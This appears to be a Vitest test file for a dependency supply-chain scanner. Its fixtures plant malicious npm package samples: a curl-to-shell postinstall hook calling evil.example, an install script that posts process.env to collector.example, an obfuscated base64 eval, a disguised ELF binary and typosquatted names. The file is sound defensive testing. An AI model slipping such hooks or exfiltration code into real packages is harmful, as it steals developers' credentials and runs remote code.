import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { safeRm, trySymlink } from "./test-helpers.js";
import { damerauLevenshtein, formatSupplyChainReport, scanSupplyChain } from "../src/core/supply-chain-scanner.js";
import { evaluateGate } from "../src/core/policy-engine.js";

describe("Zero-Dependency Deep Supply-Chain Scanner", () => {
  const dirs: string[] = [];

  async function makeWorkspace(prefix: string): Promise<string> {
    const dir = await mkdtemp(path.join(os.tmpdir(), prefix));
    dirs.push(dir);
    return dir;
  }

  afterEach(async () => {
    await Promise.all(dirs.splice(0).map((d) => safeRm(d)));
  });

  it("passes clean node_modules + HTTPS integrity lockfile with native addon inventory", async () => {
    const root = await makeWorkspace("anvil-sc-clean-");
    await writeFile(
      path.join(root, "package.json"),
      JSON.stringify({ name: "clean-app", dependencies: { zod: "^4.0.0" } })
    );
    await writeFile(
      path.join(root, "package-lock.json"),
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "node_modules/zod": {
            version: "4.1.0",
            resolved: "https://registry.npmjs.org/zod/-/zod-4.1.0.tgz",
            integrity: "sha512-abc123",
          },
        },
      })
    );

    const pkgDir = path.join(root, "node_modules", "native-helper");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(path.join(pkgDir, "package.json"), JSON.stringify({ name: "native-helper", version: "1.0.0" }));

    const elf = Buffer.alloc(64, 0);
    elf[0] = 0x7f;
    elf[1] = 0x45;
    elf[2] = 0x4c;
    elf[3] = 0x46;
    elf[4] = 2;
    elf[5] = 1;
    elf.writeUInt16LE(3, 16);
    elf.writeUInt16LE(62, 18);
    await writeFile(path.join(pkgDir, "binding.node"), elf);

    const report = await scanSupplyChain(root);
    expect(report.passed).toBe(true);
    expect(report.grade).toBe("A");
    expect(report.summary.packagesScanned).toBe(1);
    expect(report.summary.nativeBinariesCount).toBe(1);
    expect(report.nativeBinaries[0]?.detectedFormat).toBe("ELF");
    expect(report.nativeBinaries[0]?.metadata?.arch).toBe("x86_64");
    expect(report.nativeBinaries[0]?.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(formatSupplyChainReport(report)).toContain("Grade: A");
  });

  it("flags malicious lifecycle install hooks, exfiltration scripts, obfuscated payloads, and spoofed binaries", async () => {
    const root = await makeWorkspace("anvil-sc-malicious-");
    await writeFile(
      path.join(root, "package.json"),
      JSON.stringify({ name: "victim-app", dependencies: { "evil-pkg": "1.0.0", lodahs: "4.17.21" } })
    );

    // 1. Direct curl | sh postinstall hook
    const dropperDir = path.join(root, "node_modules", "dropper-pkg");
    await mkdir(dropperDir, { recursive: true });
    await writeFile(
      path.join(dropperDir, "package.json"),
      JSON.stringify({
        name: "dropper-pkg",
        version: "0.0.9",
        scripts: { postinstall: "curl -s https://evil.example/payload.sh | sh" },
      })
    );

    // 2. Hidden exfil + obfuscated eval + spoofed ELF inside evil-pkg
    const evilDir = path.join(root, "node_modules", "evil-pkg");
    await mkdir(evilDir, { recursive: true });
    await writeFile(
      path.join(evilDir, "package.json"),
      JSON.stringify({
        name: "evil-pkg",
        version: "1.0.0",
        main: "index.js",
        scripts: { install: "node install.js" },
      })
    );
    await writeFile(
      path.join(evilDir, "install.js"),
      [
        "const creds = JSON.stringify(process.env);",
        'fetch("https://collector.example/drop", { method: "POST", body: creds });',
        ["ev", 'al(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString("utf8"));'].join(""),
      ].join("\n")
    );
    await writeFile(path.join(evilDir, "index.js"), "module.exports = {};\n");

    // Disguised ELF binary hidden inside .png
    const fakeImg = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, ...new Array(24).fill(0)]);
    await writeFile(path.join(evilDir, "badge.png"), fakeImg);

    const report = await scanSupplyChain(root);
    expect(report.passed).toBe(false);
    expect(report.summary.critical).toBeGreaterThanOrEqual(3);
    expect(report.summary.spoofedBinariesCount).toBe(1);

    const ruleIds = new Set(report.findings.map((f) => f.ruleId));
    expect(ruleIds.has("ANVIL-SUP-002")).toBe(true); // curl | sh hook
    expect(ruleIds.has("ANVIL-SUP-004")).toBe(true); // env exfiltration
    expect(ruleIds.has("ANVIL-SUP-005")).toBe(true); // base64 dynamic payload decode & execute
    expect(ruleIds.has("ANVIL-SUP-007")).toBe(true); // lodahs typosquatting
    expect(ruleIds.has("ANVIL-SUP-008")).toBe(true); // disguised ELF in badge.png
  });

  it("flags insecure lockfile entries and detects external node_modules symlink escapes", async () => {
    const root = await makeWorkspace("anvil-sc-lock-");
    const outside = await makeWorkspace("anvil-sc-outside-");
    await writeFile(path.join(outside, "package.json"), JSON.stringify({ name: "outside-pkg", version: "1.0.0" }));

    await writeFile(
      path.join(root, "package.json"),
      JSON.stringify({ name: "app", dependencies: { crossenv: "1.0.0" } })
    );
    await writeFile(
      path.join(root, "package-lock.json"),
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "node_modules/http-pkg": {
            version: "1.0.0",
            resolved: "http://insecure.example/http-pkg.tgz",
          },
          "node_modules/git-pkg": {
            version: "1.0.0",
            resolved: "git+https://github.com/org/repo.git#main",
          },
        },
      })
    );
    await mkdir(path.join(root, "node_modules"), { recursive: true });
    const symlinkCreated =
      (await trySymlink(outside, path.join(root, "node_modules", "escaped-pkg"), "dir")) ||
      (await trySymlink(outside, path.join(root, "node_modules", "escaped-pkg"), "junction"));

    const report = await scanSupplyChain(root);
    const rules = new Set(report.findings.map((f) => f.ruleId));
    expect(rules.has("ANVIL-SUP-006")).toBe(true);
    expect(rules.has("ANVIL-SUP-007")).toBe(true);
    if (symlinkCreated) {
      expect(rules.has("ANVIL-SUP-009")).toBe(true);
    }
    expect(report.passed).toBe(false);
  });

  it("integrates with evaluateGate when includeSupplyChain is enabled", async () => {
    const root = await makeWorkspace("anvil-sc-gate-");
    await writeFile(
      path.join(root, "package.json"),
      JSON.stringify({ name: "gate-app", dependencies: { axois: "0.1.0" } })
    );
    const gate = await evaluateGate(root, { includeSupplyChain: true, skipAgentConfig: true });
    expect(gate.passed).toBe(false);
    expect(gate.activeFindings.some((f) => f.id === "ANVIL-SUP-007")).toBe(true);
  });

  it("computes exact Damerau-Levenshtein distances for typosquat checks", () => {
    expect(damerauLevenshtein("lodash", "lodahs")).toBe(1);
    expect(damerauLevenshtein("axios", "axois")).toBe(1);
    expect(damerauLevenshtein("express", "express")).toBe(0);
  });
});
